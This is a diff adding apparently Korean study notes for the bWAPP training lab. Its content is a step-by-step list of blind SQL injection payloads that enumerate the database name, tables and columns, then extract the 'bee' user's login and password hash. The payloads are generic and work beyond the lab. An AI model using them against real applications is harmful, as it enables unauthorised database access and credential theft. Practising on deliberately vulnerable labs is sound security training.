@@ -1,0 +1,149 @@
+ 6) SQL 인젝션
+
+ ① 
+
+' or length(database()) = 1 #
+' or length(database()) = 2 #
+' or length(database()) = 3 #
+' or length(database()) = 4 #
+' or length(database()) = 5 #
+' or length((select schema_name from information_schema.schemata limit 1,1)) = 5 #       
+
+
+ ② 
+
+' or substring(database(),1,1) = 'a' #
+~                                     
+' or substring(database(),1,1) = 'z' #
+' or substring(database(),1,1) = 'A' #
+~                                     
+' or substring(database(),1,1) = 'Z' #
+
+' or substring(database(),1,1) > 'a' #
+' or substring(database(),1,1) >= 'a' #
+' or substring(database(),1,1) < 'c' #
+' or substring(database(),1,1) = 'b' #
+
+
+' or ascii(substring(database(),2,1)) = 87 #
+' or ascii(substring(database(),3,1)) = 65 #
+' or ascii(substring(database(),4,1)) = 80 #
+' or ascii(substring(database(),5,1)) = 80 #
+
+
+ ③ 
+
+' or database() = 'bWAPP' #
+
+
+ ④ 
+
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 1 #
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 2 #
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 3 #
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 4 #
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 5 #
+
+
+ ⑤ 
+
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 1,1) < 'h' #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 1,1) >= 'u' #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 1,1) < 'v' #
+
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 1,1) = 'u' #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 2,1) = 's' #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 3,1) = 'e' #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 4,1) = 'r' #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 5,1) = 's' #
+
+' or (select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1) = 'users' #
+
+
+ ⑥ 
+
+' or length((select column_name from information_schema.columns where table_name='users' limit 0,1)) = 1 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 0,1)) = 2 #
+
+
+ ⑦ 
+
+' or substring((select column_name from information_schema.columns where table_name='users' limit 0,1), 1,1) = 'i' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 0,1), 2,1) = 'd' #
+' or (select column_name from information_schema.columns where table_name='users' limit 0,1) = 'id' #
+
+
+ ⑧ 
+
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 1 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 2 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 3 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 4 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 5 #
+
+
+ ⑨ 
+
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 1,1) = 'l' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 2,1) = 'o' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 3,1) = 'g' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 4,1) = 'i' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 5,1) = 'n' #
+' or (select column_name from information_schema.columns where table_name='users' limit 1,1) = 'login' #
+
+
+ ⑩ 
+
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 1 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 2 # 
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 3 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 4 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 5 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 6 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 7 #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 8 #
+
+
+ ⑪ 
+
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 1,1) = 'p' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 2,1) = 'a' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 3,1) = 's' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 4,1) = 's' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 5,1) = 'w' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 6,1) = 'o' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 7,1) = 'r' #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 8,1) = 'd' #
+' or (select column_name from information_schema.columns where table_name='users' limit 2,1) = 'password' #
+
+
+ ⑫ 
+
+' or length((select login from users limit 1,1)) = 1 #
+' or length((select login from users limit 1,1)) = 2 #
+' or length((select login from users limit 1,1)) = 3 #
+
+
+ ⑬ 
+
+' or substring((select login from users limit 1,1), 1,1) = 'b' #
+' or substring((select login from users limit 1,1), 2,1) = 'e' #
+' or substring((select login from users limit 1,1), 3,1) = 'e' #
+' or (select login from users limit 1,1) = 'bee' #
+
+
+ ⑭ 
+
+' or length((select password from users where login='bee')) = 20 #
+' or length((select password from users where login='bee')) = 40 #
+
+
+ ⑮ 
+
+' or substring((select password from users where login='bee'), 1,1) >= '6' #
+' or substring((select password from users where login='bee'), 1,1) > '7' #
+
+' or (select password from users where login='bee') = '6885858486f31043e5839c735d99457f045affd0' #
+
+' or md5("bug") = (select password from users where login='bee') #
+' or sha1("bug") = (select password from users where login='bee') #
